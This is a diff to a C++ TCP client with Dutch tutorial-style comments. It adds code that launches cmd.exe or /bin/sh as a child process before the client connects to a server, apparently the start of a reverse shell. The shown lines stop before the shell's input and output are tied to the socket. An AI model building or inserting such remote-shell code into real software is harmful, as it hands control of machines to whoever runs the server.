@@ -25,6 +25,13 @@
     #define closesocket close
 #endif
 
+// Welke shell starten we? Op Windows cmd.exe, op Linux /bin/sh.
+#ifdef _WIN32
+const std::string SHELL = "cmd.exe";
+#else
+const std::string SHELL = "/bin/sh";
+#endif
+
 int main() {
 #ifdef _WIN32
     // Winsock opstarten (alleen Windows), zie uitleg in server.cpp.
@@ -35,13 +42,21 @@ int main() {
     }
 #endif
 
+    KindProces shell;
+    if (!shell.start(SHELL, "")) {   // leeg argument = shell zonder argument
+        std::cerr << "Kon " << SHELL << " niet starten.\n";
+        return 1;
+    }
+  
+    std::atomic<bool> loopt{true};
+  
     // Stap 1: een TCP-socket maken.
     SOCKET sock = socket(AF_INET, SOCK_STREAM, 0);
     if (sock == INVALID_SOCKET) {
         std::cerr << "Kon geen socket maken\n";
         return 1;
     }
-
+  
     // Stap 2: het adres van de SERVER invullen.
     sockaddr_in serverAddress{};
     serverAddress.sin_family = AF_INET;
